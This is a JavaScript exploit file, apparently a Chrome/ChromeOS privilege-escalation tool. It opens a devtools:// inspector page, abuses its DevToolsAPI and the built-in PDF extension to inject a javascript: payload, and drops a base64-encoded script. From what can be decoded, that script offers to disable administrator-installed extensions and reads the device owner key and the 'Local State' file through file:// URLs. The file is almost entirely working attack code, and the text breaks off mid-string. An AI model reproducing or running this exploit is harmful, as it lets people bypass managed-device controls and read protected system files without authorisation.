(function () {
    if (!opener) {
        opener = window;
    }
    // alert(origin);

    //     window.w = w;
    // })
    const w = window.opener.open("devtools://devtools/bundled/inspector.html");
    window.opener.close();
    w.addEventListener("load", async () => {
        if (!w.DevToolsAPI) {
            console.log("reloading");
            w.opener = null;
            w.location.reload();
        }
        await sleep(500);
        console.log("Got DevToolsAPI object from opened window:", w.DevToolsAPI);
        exploit(w);
    });

    window.w = w;


    function exploit(w) {


        function ui() {
            const pdfId = "mhjfbmdgcfjbbpaeojofohoefgiehjai";
            var globalUID = 0;
            let globalMap = [];
            function payload_swamp(w, d) {
                const pdfId = "mhjfbmdgcfjbbpaeojofohoefgiehjai"; // Redefinition because we convert this function to a string
                const mojoURL = "chrome://resources/mojo/mojo/public/js/bindings.js";
                console.log('hi');
                if (location.origin.includes("chrome-extension://" + pdfId)) {
                    w.close();
                    chrome.tabs.getCurrent(function (info) {
                        chrome.windows.create({
                            setSelfAsOpener: true,
                            url: mojoURL
                        }, function (win) {
                            const r = win.tabs[0].id;
                            chrome.tabs.executeScript(r, { code: `location.href = \"javascript:${atob('%%CHROMEPAYLOAD%%')}\"` });

                        })
                    })


                    return;
                }
                // console.log(d);
                // w.setTimeout(function() {
                const blob_url = new Blob(["alert(1)"], { type: "text/html" });

                w.webkitRequestFileSystem(TEMPORARY, 2 * 1024 * 1024, async function (fs) {
                    function removeFile(file) {
                        return new Promise(function (resolve, reject) {
                            fs.root.getFile(file, { create: true }, function (entry) {
                                entry.remove(resolve);
                            })
                        });
                    }
                    function writeFile(file, data) {
                        return new Promise((resolve, reject) => {
                            fs.root.getFile(file, { create: true }, function (entry) {
                                entry.remove(function () {
                                    fs.root.getFile(file, { create: true }, function (entry) {
                                        entry.createWriter(function (writer) {
                                            writer.write(new Blob([data]));
                                            resolve(entry.toURL());
                                        })
                                    })
                                })
                            })
                        })
                    };
                    if (d.cleanup) {
                        console.log("cleaning up");
                        debugger;
                        await removeFile('index.js');
                        await removeFile('index.html');
                        alert("Cleaned up successfully!");
                        cleanup();
                        w.close();
                        return;
                    }
                    await writeFile('index.js', atob(`b25lcnJvciA9IGFsZXJ0OwoKY29uc3QgdWlUZW1wbGF0ZSA9IGAKCmA7CgppZiAobG9jYWxTdG9yYWdlLmdldEl0ZW0oInVzZXJkZWZJZHMiKSA9PT0gbnVsbCkKICAgIGxvY2FsU3RvcmFnZS5zZXRJdGVtKCJ1c2VyZGVmSWRzIiwgSlNPTi5zdHJpbmdpZnkoW10pKTsKCkFycmF5LnByb3RvdHlwZS5yZW1vdmUgPSBmdW5jdGlvbihpdGVtKSB7CiAgICBpZiAodGhpcy5pbmRleE9mKGl0ZW0pID09PSAtMSkgdGhyb3cgbmV3IEVycm9yKCJub3QgaW4gYXJyYXkiKTsKICAgIHRoaXMuc3BsaWNlKHRoaXMuaW5kZXhPZihpdGVtKSwgMSk7Cn07CgpmdW5jdGlvbiBtYWtlVG9hc3QobXNnLCB0aW1lKSB7CiAgICBjb25zdCBwb3BvdmVyID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiYXJ0aWNsZSIpOwogICAgcG9wb3Zlci5wb3BvdmVyID0gIm1hbnVhbCI7CiAgICBwb3BvdmVyLmNsYXNzTGlzdC5hZGQoInRvYXN0Iik7CiAgICBwb3BvdmVyLmNsYXNzTGlzdC5hZGQoIm5ld2VzdCIpOwogICAgcG9wb3Zlci50ZXh0Q29udGVudCA9IG1zZzsKICAgIHBvcG92ZXIuc3R5bGUudHJhbnNsYXRlID0gIi01MCUiOwoKICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQocG9wb3Zlcik7CiAgICBwb3BvdmVyLnNob3dQb3BvdmVyKCk7CgogICAgc2V0VGltZW91dCgoKSA9PiB7CiAgICAgICAgcG9wb3Zlci5oaWRlUG9wb3ZlcigpOwogICAgICAgIHNldFRpbWVvdXQoKCkgPT4gewogICAgICAgICAgICBwb3BvdmVyLnJlbW92ZSgpOwogICAgICAgIH0sIDUwMCk7CiAgICB9LCB0aW1lICogMTAwMCk7CgogICAgcG9wb3Zlci5hZGRFdmVudExpc3RlbmVyKCJ0b2dnbGUiLCAoZXZlbnQpID0+IHsKICAgICAgICBpZiAoZXZlbnQubmV3U3RhdGUgPT09ICJvcGVuIikgewogICAgICAgICAgICBtb3ZlVG9hc3RzKCk7CiAgICAgICAgfQogICAgfSk7Cn0KCmZ1bmN0aW9uIG1vdmVUb2FzdHMoKSB7CiAgICBjb25zdCB0b2FzdHMgPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCIudG9hc3QiKTsKCiAgICB0b2FzdHMuZm9yRWFjaCgodG9hc3QpID0+IHsKICAgICAgICBpZiAodG9hc3QuY2xhc3NMaXN0LmNvbnRhaW5zKCJuZXdlc3QiKSkgewogICAgICAgICAgICB0b2FzdC5zdHlsZS50b3AgPSBgNXB4YDsKICAgICAgICAgICAgdG9hc3QuY2xhc3NMaXN0LnJlbW92ZSgibmV3ZXN0Iik7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgY29uc3QgcHJldlZhbHVlID0gdG9hc3Quc3R5bGUudG9wLnJlcGxhY2UoInB4IiwgIiIpOwogICAgICAgICAgICBjb25zdCBuZXdWYWx1ZSA9IHBhcnNlSW50KHByZXZWYWx1ZSkgKyB0b2FzdC5jbGllbnRIZWlnaHQgKyAxMDsKICAgICAgICAgICAgdG9hc3Quc3R5bGUudG9wID0gYCR7bmV3VmFsdWV9cHhgOwogICAgICAgIH0KICAgIH0pOwp9CgpmdW5jdGlvbiBtYWtlRGlhbG9nKHRpdGxlLCBtc2csIG9uY2FuY2VsLCBvbmNvbmZpcm0pIHsKICAgIGNvbnN0IGRpYWxvZyA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpYWxvZyIpOwogICAgY29uc3QgY29uZmlybUJ0biA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImJ1dHRvbiIpOwogICAgY29uc3QgY2FuY2VsQnRuID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiYnV0dG9uIik7CiAgICBjb25zdCBoZWFkID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaDEiKTsKICAgIGNvbnN0IGJvZHkgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKICAgIGNvbnN0IGZvb3QgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKCiAgICBkaWFsb2cuYXBwZW5kQ2hpbGQoaGVhZCk7CiAgICBkaWFsb2cuYXBwZW5kQ2hpbGQoYm9keSk7CiAgICBkaWFsb2cuYXBwZW5kQ2hpbGQoZm9vdCk7CiAgICBmb290LmFwcGVuZENoaWxkKGNvbmZpcm1CdG4pOwogICAgZm9vdC5hcHBlbmRDaGlsZChjYW5jZWxCdG4pOwogICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChkaWFsb2cpOwoKICAgIGhlYWQudGV4dENvbnRlbnQgPSB0aXRsZTsKCiAgICBib2R5LnN0eWxlLm92ZXJmbG93WSA9ICJzY3JvbGwiOwogICAgYm9keS5zdHlsZS5jb2xvciA9ICJyZ2IoMjIwIDIyMCAyMjApIjsKICAgIGJvZHkuc3R5bGUuZm9udFNpemUgPSAiMXJlbSI7CiAgICBib2R5LnN0eWxlLmJvcmRlclJhZGl1cyA9ICIxMHB4IjsKICAgIGJvZHkuc3R5bGUucGFkZGluZyA9ICIxMHB4IjsKICAgIGJvZHkuc3R5bGUubWFyZ2luQm90dG9tID0gIjEwcHgiOwoKICAgIGlmIChBcnJheS5pc0FycmF5KG1zZykpIHsKICAgICAgICBib2R5LnN0eWxlLmJvcmRlciA9ICJzb2xpZCAxcHggIzFkMWQxZCI7CiAgICAgICAgbXNnLmZvckVhY2goKHZhbHVlKSA9PiB7CiAgICAgICAgICAgIGxldCBpdGVtID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgicCIpOwogICAgICAgICAgICBpdGVtLnRleHRDb250ZW50ID0gdmFsdWU7CiAgICAgICAgICAgIGJvZHkuYXBwZW5kQ2hpbGQoaXRlbSk7CiAgICAgICAgfSk7CiAgICB9IGVsc2UgewogICAgICAgIGJvZHkuc3R5bGUuYm9yZGVyID0gInNvbGlkIDFweCAjMmQyZDJkIjsKICAgICAgICBib2R5LnRleHRDb250ZW50ID0gbXNnOwogICAgfQoKICAgIGZvb3Quc3R5bGUuaGVpZ2h0ID0gImZpdC1jb250ZW50IjsKICAgIGZvb3Quc3R5bGUubWFyZ2luVG9wID0gImF1dG8iOwogICAgZm9vdC5zdHlsZS5kaXNwbGF5ID0gImZsZXgiOwogICAgZm9vdC5zdHlsZS5mbGV4RGlyZWN0aW9uID0gInJvdy1yZXZlcnNlIjsKCiAgICBjb25maXJtQnRuLmNsYXNzTGlzdC5hZGQoImNvbmZpcm1CdG4iKTsKICAgIGNvbmZpcm1CdG4uYWRkRXZlbnRMaXN0ZW5lcigiY2xpY2siLCAoKSA9PiB7CiAgICAgICAgZGlhbG9nLmNsb3NlKCk7CiAgICAgICAgb25jb25maXJtKCk7CiAgICAgICAgc2V0VGltZW91dCgoKSA9PiBkaWFsb2cucmVtb3ZlKCksIDEwMDApOwogICAgfSk7CiAgICBjb25maXJtQnRuLnRleHRDb250ZW50ID0gIkNvbmZpcm0iOwoKICAgIGNhbmNlbEJ0bi5jbGFzc0xpc3QuYWRkKCJjYW5jZWxCdG4iKTsKICAgIGNhbmNlbEJ0bi5hZGRFdmVudExpc3RlbmVyKCJjbGljayIsICgpID0+IHsKICAgICAgICBkaWFsb2cuY2xvc2UoKTsKICAgICAgICBvbmNhbmNlbCgpOwogICAgICAgIHNldFRpbWVvdXQoKCkgPT4gZGlhbG9nLnJlbW92ZSgpLCAxMDAwKTsKICAgIH0pOwogICAgY2FuY2VsQnRuLnRleHRDb250ZW50ID0gIkNhbmNlbCI7CgogICAgZGlhbG9nLnNob3dNb2RhbCgpOwp9Cgphc3luYyBmdW5jdGlvbiBleHRlbnNpb25FeGlzdHMoaWQpIHsKICAgIHJldHVybiBuZXcgUHJvbWlzZSgocmVzb2x2ZSkgPT4KICAgICAgICBjaHJvbWUubWFuYWdlbWVudC5nZXRBbGwoKGV4dGVuc2lvbnMpID0+CiAgICAgICAgICAgIHJlc29sdmUoZXh0ZW5zaW9ucy5zb21lKChleHQpID0+IGV4dC5pZCA9PT0gaWQpKQogICAgICAgICkKICAgICk7Cn0KCmNvbnN0IG1hbmFnZW1lbnRUZW1wbGF0ZSA9IGAKPHRpdGxlPlVudGl0bGVkIGRvY3VtZW50PC90aXRsZT4KPGxpbmsgcmVsPSJpY29uIiB0eXBlPSJpbWFnZS94LWljb24iIGhyZWY9Imh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9jcm9zc2pibHkvSGFyVG9vbHMtcmlndG9vbHMxMjhwbHVzL3JlZnMvaGVhZHMvbWFpbi9kb2NzLmljbyI+CjxkaXYgaWQ9ImNocm9tZV9tYW5hZ2VtZW50X2Rpc2FibGVfZXh0Ij4KICA8ZGl2IGNsYXNzPSJoZWFkZXIiPgogICAgPGltZyBzcmM9Imh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9jcm9zc2pibHkvSGFyVG9vbHMtcmlndG9vbHMxMjhwbHVzL3JlZnMvaGVhZHMvbWFpbi9oYXJ0b29scy5naWYiIGFsdD0iSGFyVG9vbHMgTG9nbyIgY2xhc3M9ImxvZ28iIC8+CiAgICA8aDE+IGNocm9tZS5tYW5hZ2VtZW50IERpc2FibGUgRXh0ZW5zaW9ucyA8L2gxPgogIDwvZGl2PgogIDxwIGNsYXNzPSJkZXNjcmlwdGlvbiI+Z2l0aHViIHJlcG86IGh0dHBzOi8vZ2l0aHViLmNvbS9jcm9zc2pibHkvSGFyVG9vbHMvIHwgLkhBUiBYU1MgZm91bmQgYnkgPGEgaHJlZj0iaHR0cHM6Ly9jcm9zc2pibHkucGFnZXMuZGV2LyI+Y3Jvc3NqYmx5PC9hPiAoY3JlZGl0czogYXhxbXg6IHRlc3RpbmcgfCBCbG9iYnkgQm9pOiB0ZXN0aW5nIGFuZCBoZWxwIHdpdGggZGV2ZWxvcG1lbnQgfCB1bnJldGFpbmVkOiBvcmlnaW5hbCBkZXZ0b29scyB4c3MgW2Euay5hIHJpZ3Rvb2xzXSkKICA8cD5FeHRlbnNpb25zPC9wPgogIDx3aGl0ZWJ1dHRvbnM+CiAgPGJ1dHRvbiBpZD0iY3VycmVudC1leHRlbnNpb24iPkRpc2FibGUgaW5qZWN0ZWQgZXh0ZW5zaW9uPC9idXR0b24+CiAgPGJ1dHRvbiBpZD0icm12LWNtbi1ibHQiPlJlbW92ZSBCbG9hdDwvYnV0dG9uPgogIDxidXR0b24gaWQ9ImRpc2FibGUtdXNlcmRlZi1leHRzIj5EaXNhYmxlIHVzZXIgZGVmaW5lZCBsaXN0IG9mIGV4dGVuc2lvbnM8L2J1dHRvbj4KICA8L3doaXRlYnV0dG9ucz4KCiAgPGJyIC8+PGJyIC8+CiAgPHVsIGNsYXNzPSJleHRsaXN0Ij4KICA8L3VsPgoKICA8ZGl2IHN0eWxlPSJoZWlnaHQ6IDUwcHgiPjwvZGl2Pgo8L2Rpdj4KCmA7CmxldCBzYXZlZEV4dExpc3QgPSBbXTsKY29uc3Qga0ZpbGVzID0gWwogICAgIi92YXIvbGliL2RldmljZXNldHRpbmdzL293bmVyLmtleSIsCiAgICAiL2hvbWUvY2hyb25vcy9Mb2NhbCBTdGF0ZSIKXQphc3luYyBmdW5jdGlvbiByZWFkRmlsZShwYXRoKSB7CiAgICByZXR1cm4gKGF3YWl0IGZldGNoKCJmaWxlOi8vIiArIHBhdGgpKS5hcnJheUJ1ZmZlcigpOwp9CmFzeW5jIGZ1bmN0aW9uIGZpbmRMYXN0UG9saWN5RmlsZSgpIHsKICAgIGNvbnN0IGtEZXZpY2VQb2xpY3kgPSAiL3Zhci9saWIvZGV2aWNlc2V0dGluZ3MvcG9saWN5LiI7CiAgICBsZXQgZm91bmRTb21ldGhpbmcgPSBmYWxzZTsKICAgIGxldCBpID0gMDsKICAgIHdoaWxlICh0cnVlKSB7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgY29uc29sZS5sb2coIlRyeWluZyAiICsga0RldmljZVBvbGljeSArIGkpOwogICAgICAgICAgICBhd2FpdCByZWFkRmlsZShrRGV2aWNlUG9saWN5ICsgaSk7CiAgICAgICAgICAgIGZvdW5kU29tZXRoaW5nID0gdHJ1ZTsKICAgICAgICB9IGNhdGNoIHsKICAgICAgICAgICAgaWYgKGZvdW5kU29tZXRoaW5nKSB7CiAgICAgICAgICAgICAgICByZXR1cm4ga0RldmljZVBvbGljeSArIChpIC0gMSk7CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgaSsrOwogICAgfQp9CgpmdW5jdGlvbiBkb2VzTmVlZEZpbGVBY2Nlc3MoKSB7CiAgICBjb25zdCBzYyA9IGNocm9tZS5ydW50aW1lLmdldE1hbmlmZXN0KCkucGVybWlzc2lvbnM7CiAgICByZXR1cm4gc2MuaW5jbHVkZXMoImFjdGl2ZVRhYiIpIHx8IHNjLmluY2x1ZGVzKCI8YWxsX3VybHM+Iik7Cn0KCmZ1bmN0aW9uIG5vcm1hbGl6ZVN0cmluZ1Bvc2l4KHBhdGgsIGFsbG93QWJvdmVSb290KSB7CiAgICB2YXIgcmVzID0gJyc7CiAgICB2YXIgbGFzdFNlZ21lbnRMZW5ndGggPSAwOwogICAgdmFyIGxhc3RTbGFzaCA9IC0xOwogICAgdmFyIGRvdHMgPSAwOwogICAgdmFyIGNvZGU7CiAgICBmb3IgKHZhciBpID0gMDsgaSA8PSBwYXRoLmxlbmd0aDsgKytpKSB7CiAgICAgICAgaWYgKGkgPCBwYXRoLmxlbmd0aCkKICAgICAgICAgICAgY29kZSA9IHBhdGguY2hhckNvZGVBdChpKTsKICAgICAgICBlbHNlIGlmIChjb2RlID09PSA0NykKICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgZWxzZQogICAgICAgICAgICBjb2RlID0gNDc7CiAgICAgICAgaWYgKGNvZGUgPT09IDQ3KSB7CiAgICAgICAgICAgIGlmIChsYXN0U2xhc2ggPT09IGkgLSAxIHx8IGRvdHMgPT09IDEpIHsKCiAgICAgICAgICAgIH0gZWxzZSBpZiAobGFzdFNsYXNoICE9PSBpIC0gMSAmJiBkb3RzID09PSAyKSB7CiAgICAgICAgICAgICAgICBpZiAocmVzLmxlbmd0aCA8IDIgfHwgbGFzdFNlZ21lbnRMZW5ndGggIT09IDIgfHwgcmVzLmNoYXJDb2RlQXQocmVzLmxlbmd0aCAtIDEpICE9PSA0NiB8fCByZXMuY2hhckNvZGVBdChyZXMubGVuZ3RoIC0gMikgIT09IDQ2KSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKHJlcy5sZW5ndGggPiAyKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHZhciBsYXN0U2xhc2hJbmRleCA9IHJlcy5sYXN0SW5kZXhPZignLycpOwogICAgICAgICAgICAgICAgICAgICAgICBpZiAobGFzdFNsYXNoSW5kZXggIT09IHJlcy5sZW5ndGggLSAxKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAobGFzdFNsYXNoSW5kZXggPT09IC0xKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVzID0gJyc7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGFzdFNlZ21lbnRMZW5ndGggPSAwOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXMgPSByZXMuc2xpY2UoMCwgbGFzdFNsYXNoSW5kZXgpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxhc3RTZWdtZW50TGVuZ3RoID0gcmVzLmxlbmd0aCAtIDEgLSByZXMubGFzdEluZGV4T2YoJy8nKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxhc3RTbGFzaCA9IGk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBkb3RzID0gMDsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmIChyZXMubGVuZ3RoID09PSAyIHx8IHJlcy5sZW5ndGggPT09IDEpIHsKICAgICAgICAgICAgICAgICAgICAgICAgcmVzID0gJyc7CiAgICAgICAgICAgICAgICAgICAgICAgIGxhc3RTZWdtZW50TGVuZ3RoID0gMDsKICAgICAgICAgICAgICAgICAgICAgICAgbGFzdFNsYXNoID0gaTsKICAgICAgICAgICAgICAgICAgICAgICAgZG90cyA9IDA7CiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGlmIChhbGxvd0Fib3ZlUm9vdCkgewogICAgICAgICAgICAgICAgICAgIGlmIChyZXMubGVuZ3RoID4gMCkKICAgICAgICAgICAgICAgICAgICAgICAgcmVzICs9ICcvLi4nOwogICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgcmVzID0gJy4uJzsKICAgICAgICAgICAgICAgICAgICBsYXN0U2VnbWVudExlbmd0aCA9IDI7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICBpZiAocmVzLmxlbmd0aCA+IDApCiAgICAgICAgICAgICAgICAgICAgcmVzICs9ICcvJyArIHBhdGguc2xpY2UobGFzdFNsYXNoICsgMSwgaSk7CiAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgcmVzID0gcGF0aC5zbGljZShsYXN0U2xhc2ggKyAxLCBpKTsKICAgICAgICAgICAgICAgIGxhc3RTZWdtZW50TGVuZ3RoID0gaSAtIGxhc3RTbGFzaCAtIDE7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgbGFzdFNsYXNoID0gaTsKICAgICAgICAgICAgZG90cyA9IDA7CiAgICAgICAgfSBlbHNlIGlmIChjb2RlID09PSA0NiAmJiBkb3RzICE9PSAtMSkgewogICAgICAgICAgICArK2RvdHM7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgZG90cyA9IC0xOwogICAgICAgIH0KICAgIH0KICAgIHJldHVybiByZXM7Cn0KCmZ1bmN0aW9uIF9mb3JtYXQoc2VwLCBwYXRoT2JqZWN0KSB7CiAgICB2YXIgZGlyID0gcGF0aE9iamVjdC5kaXIgfHwgcGF0aE9iamVjdC5yb290OwogICAgdmFyIGJhc2UgPSBwYXRoT2JqZWN0LmJhc2UgfHwgKHBhdGhPYmplY3QubmFtZSB8fCAnJykgKyAocGF0aE9iamVjdC5leHQgfHwgJycpOwogICAgaWYgKCFkaXIpIHsKICAgICAgICByZXR1cm4gYmFzZTsKICAgIH0KICAgIGlmIChkaXIgPT09IHBhdGhPYmplY3Qucm9vdCkgewogICAgICAgIHJldHVybiBkaXIgKyBiYXNlOwogICAgfQogICAgcmV0dXJuIGRpciArIHNlcCArIGJhc2U7Cn0KdmFyIHBvc2l4ID0gewoKICAgIHJlc29sdmU6IGZ1bmN0aW9uIHJlc29sdmUoKSB7CiAgICAgICAgdmFyIHJlc29sdmVkUGF0aCA9ICcnOwogICAgICAgIHZhciByZXNvbHZlZEFic29sdXRlID0gZmFsc2U7CiAgICAgICAgdmFyIGN3ZDsKICAgICAgICBmb3IgKHZhciBpID0gYXJndW1lbnRzLmxlbmd0aCAtIDE7IGkgPj0gLTEgJiYgIXJlc29sdmVkQWJzb2x1dGU7IGktLSkgewogICAgICAgICAgICB2YXIgcGF0aDsKICAgICAgICAgICAgaWYgKGkgPj0gMCkKICAgICAgICAgICAgICAgIHBhdGggPSBhcmd1bWVudHNbaV07CiAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgaWYgKGN3ZCA9PT0gdW5kZWZpbmVkKQogICAgICAgICAgICAgICAgICAgIGN3ZCA9IHByb2Nlc3MuY3dkKCk7CiAgICAgICAgICAgICAgICBwYXRoID0gY3dkOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGFzc2VydFBhdGgocGF0aCk7CgogICAgICAgICAgICBpZiAocGF0aC5sZW5ndGggPT09IDApIHsKICAgICAgICAgICAgICAgIGNvbnRpbnVlOwogICAgICAgICAgICB9CiAgICAgICAgICAgIHJlc29sdmVkUGF0aCA9IHBhdGggKyAnLycgKyByZXNvbHZlZFBhdGg7CiAgICAgICAgICAgIHJlc29sdmVkQWJzb2x1dGUgPSBwYXRoLmNoYXJDb2RlQXQoMCkgPT09IDQ3OwogICAgICAgIH0KCiAgICAgICAgcmVzb2x2ZWRQYXRoID0gbm9ybWFsaXplU3RyaW5nUG9zaXgocmVzb2x2ZWRQYXRoLCAhcmVzb2x2ZWRBYnNvbHV0ZSk7CiAgICAgICAgaWYgKHJlc29sdmVkQWJzb2x1dGUpIHsKICAgICAgICAgICAgaWYgKHJlc29sdmVkUGF0aC5sZW5ndGggPiAwKQogICAgICAgICAgICAgICAgcmV0dXJuICcvJyArIHJlc29sdmVkUGF0aDsKICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgcmV0dXJuICcvJzsKICAgICAgICB9IGVsc2UgaWYgKHJlc29sdmVkUGF0aC5sZW5ndGggPiAwKSB7CiAgICAgICAgICAgIHJldHVybiByZXNvbHZlZFBhdGg7CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgcmV0dXJuICcuJzsKICAgICAgICB9CiAgICB9LAogICAgbm9ybWFsaXplOiBmdW5jdGlvbiBub3JtYWxpemUocGF0aCkgewogICAgICAgIGFzc2VydFBhdGgocGF0aCk7CiAgICAgICAgaWYgKHBhdGgubGVuZ3RoID09PSAwKSByZXR1cm4gJy4nOwogICAgICAgIHZhciBpc0Fic29sdXRlID0gcGF0aC5jaGFyQ29kZUF0KDApID09PSA0NzsKICAgICAgICB2YXIgdHJhaWxpbmdTZXBhcmF0b3IgPSBwYXRoLmNoYXJDb2RlQXQocGF0aC5sZW5ndGggLSAxKSA9PT0gNDc7CgogICAgICAgIHBhdGggPSBub3JtYWxpemVTdHJpbmdQb3NpeChwYXRoLCAhaXNBYnNvbHV0ZSk7CiAgICAgICAgaWYgKHBhdGgubGVuZ3RoID09PSAwICYmICFpc0Fic29sdXRlKSBwYXRoID0gJy4nOwogICAgICAgIGlmIChwYXRoLmxlbmd0aCA+IDAgJiYgdHJhaWxpbmdTZXBhcmF0b3IpIHBhdGggKz0gJy8nOwogICAgICAgIGlmIChpc0Fic29sdXRlKSByZXR1cm4gJy8nICsgcGF0aDsKICAgICAgICByZXR1cm4gcGF0aDsKICAgIH0sCiAgICBpc0Fic29sdXRlOiBmdW5jdGlvbiBpc0Fic29sdXRlKHBhdGgpIHsKICAgICAgICBhc3NlcnRQYXRoKHBhdGgpOwogICAgICAgIHJldHVybiBwYXRoLmxlbmd0aCA+IDAgJiYgcGF0aC5jaGFyQ29kZUF0KDApID09PSA0NzsKICAgIH0sCiAgICBqb2luOiBmdW5jdGlvbiBqb2luKCkgewogICAgICAgIGlmIChhcmd1bWVudHMubGVuZ3RoID09PSAwKQogICAgICAgICAgICByZXR1cm4gJy4nOwogICAgICAgIHZhciBqb2luZWQ7CiAgICAgICAgZm9yICh2YXIgaSA9IDA7IGkgPCBhcmd1bWVudHMubGVuZ3RoOyArK2kpIHsKICAgICAgICAgICAgdmFyIGFyZyA9IGFyZ3VtZW50c1tpXTsKICAgICAgICAgICAgYXNzZXJ0UGF0aChhcmcpOwogICAgICAgICAgICBpZiAoYXJnLmxlbmd0aCA+IDApIHsKICAgICAgICAgICAgICAgIGlmIChqb2luZWQgPT09IHVuZGVmaW5lZCkKICAgICAgICAgICAgICAgICAgICBqb2luZWQgPSBhcmc7CiAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgam9pbmVkICs9ICcvJyArIGFyZzsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBpZiAoam9pbmVkID09PSB1bmRlZmluZWQpCiAgICAgICAgICAgIHJldHVybiAnLic7CiAgICAgICAgcmV0dXJuIHBvc2l4Lm5vcm1hbGl6ZShqb2luZWQpOwogICAgfSwKICAgIHJlbGF0aXZlOiBmdW5jdGlvbiByZWxhdGl2ZShmcm9tLCB0bykgewogICAgICAgIGFzc2VydFBhdGgoZnJvbSk7CiAgICAgICAgYXNzZXJ0UGF0aCh0byk7CiAgICAgICAgaWYgKGZyb20gPT09IHRvKSByZXR1cm4gJyc7CiAgICAgICAgZnJvbSA9IHBvc2l4LnJlc29sdmUoZnJvbSk7CiAgICAgICAgdG8gPSBwb3NpeC5yZXNvbHZlKHRvKTsKICAgICAgICBpZiAoZnJvbSA9PT0gdG8pIHJldHVybiAnJzsKCiAgICAgICAgdmFyIGZyb21TdGFydCA9IDE7CiAgICAgICAgZm9yICg7IGZyb21TdGFydCA8IGZyb20ubGVuZ3RoOyArK2Zyb21TdGFydCkgewogICAgICAgICAgICBpZiAoZnJvbS5jaGFyQ29kZUF0KGZyb21TdGFydCkgIT09IDQ3KQogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgfQogICAgICAgIHZhciBmcm9tRW5kID0gZnJvbS5sZW5ndGg7CiAgICAgICAgdmFyIGZyb21MZW4gPSBmcm9tRW5kIC0gZnJvbVN0YXJ0OwoKICAgICAgICB2YXIgdG9TdGFydCA9IDE7CiAgICAgICAgZm9yICg7IHRvU3RhcnQgPCB0by5sZW5ndGg7ICsrdG9TdGFydCkgewogICAgICAgICAgICBpZiAodG8uY2hhckNvZGVBdCh0b1N0YXJ0KSAhPT0gNDcpCiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICB9CiAgICAgICAgdmFyIHRvRW5kID0gdG8ubGVuZ3RoOwogICAgICAgIHZhciB0b0xlbiA9IHRvRW5kIC0gdG9TdGFydDsKCiAgICAgICAgdmFyIGxlbmd0aCA9IGZyb21MZW4gPCB0b0xlbiA/IGZyb21MZW4gOiB0b0xlbjsKICAgICAgICB2YXIgbGFzdENvbW1vblNlcCA9IC0xOwogICAgICAgIHZhciBpID0gMDsKICAgICAgICBmb3IgKDsgaSA8PSBsZW5ndGg7ICsraSkgewogICAgICAgICAgICBpZiAoaSA9PT0gbGVuZ3RoKSB7CiAgICAgICAgICAgICAgICBpZiAodG9MZW4gPiBsZW5ndGgpIHsKICAgICAgICAgICAgICAgICAgICBpZiAodG8uY2hhckNvZGVBdCh0b1N0YXJ0ICsgaSkgPT09IDQ3KSB7CgogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gdG8uc2xpY2UodG9TdGFydCArIGkgKyAxKTsKICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKGkgPT09IDApIHsKCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiB0by5zbGljZSh0b1N0YXJ0ICsgaSk7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfSBlbHNlIGlmIChmcm9tTGVuID4gbGVuZ3RoKSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKGZyb20uY2hhckNvZGVBdChmcm9tU3RhcnQgKyBpKSA9PT0gNDcpIHsKCiAgICAgICAgICAgICAgICAgICAgICAgIGxhc3RDb21tb25TZXAgPSBpOwogICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoaSA